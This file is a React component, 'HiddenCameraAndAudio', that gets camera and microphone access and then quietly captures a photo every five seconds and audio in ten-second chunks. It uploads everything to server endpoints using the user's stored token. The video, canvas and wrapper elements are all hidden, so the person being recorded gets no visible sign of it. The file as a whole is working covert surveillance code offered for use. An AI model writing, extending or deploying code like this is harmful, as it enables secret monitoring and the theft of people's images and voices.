import { useEffect, useRef, useState } from "react";
import axios from "axios";

export default function HiddenCameraAndAudio() {
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const [isRecording, setIsRecording] = useState(false);

  const stream = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    const requestMediaAccess = async () => {
      try {
        const newStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true,
        });

        stream.current = newStream;
        setHasPermission(true);

        if (videoRef.current) {
          videoRef.current.srcObject = newStream;
        }

        const mediaRecorder = new MediaRecorder(newStream);
        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            audioChunksRef.current.push(event.data);
          }
        };

        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunksRef.current, {
            type: "audio/webm",
          });
          await uploadAudio(audioBlob);
          audioChunksRef.current = [];
        };

        mediaRecorderRef.current = mediaRecorder;
      } catch (error) {
        console.error("error", error);
        setHasPermission(false);
      }
    };

    requestMediaAccess();

    return () => {
      if (stream.current) {
        stream.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    const imageInterval = setInterval(() => {
      if (hasPermission) {
        capturePhoto();
      }
    }, 5000);

    const audioInterval = setInterval(() => {
      if (mediaRecorderRef.current) {
        if (mediaRecorderRef.current.state === "inactive") {
          mediaRecorderRef.current.start();
          setIsRecording(true);
        } else {
          mediaRecorderRef.current.stop();
          setIsRecording(false);
        }
      }
    }, 10000);

    return () => {
      clearInterval(imageInterval);
      clearInterval(audioInterval);
    };
  }, [hasPermission]);

  const capturePhoto = async () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;

    if (!canvas || !video) return;

    const context = canvas.getContext("2d");
    if (!context) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      if (!blob) return;

      const formData = new FormData();
      formData.append("image", blob, "hidden-capture.png");

      try {
        const token = localStorage.getItem("user");
        await axios.post("/api/upload", formData, {
          headers: {
            Authorization: `Bearer ${token}`,
          },
        });

        console.log("photo sended");
      } catch (error) {
        console.error("error in send photo", error);
      }
    }, "image/png");
  };

  const uploadAudio = async (audioBlob: Blob) => {
    const formData = new FormData();
    formData.append("audio", audioBlob, "recorded-audio.webm");

    try {
      const token = localStorage.getItem("user");
      await axios.post("/api/upload-audio", formData, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      });

      console.log("record sended");
    } catch (error) {
      console.error("error in record file", error);
    }
  };

  return (
    <div className="hidden">
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
      <canvas ref={canvasRef} className="hidden"></canvas>
      <p className="">{isRecording ? "recording" : "waiting for recording"}</p>
    </div>
  );
}
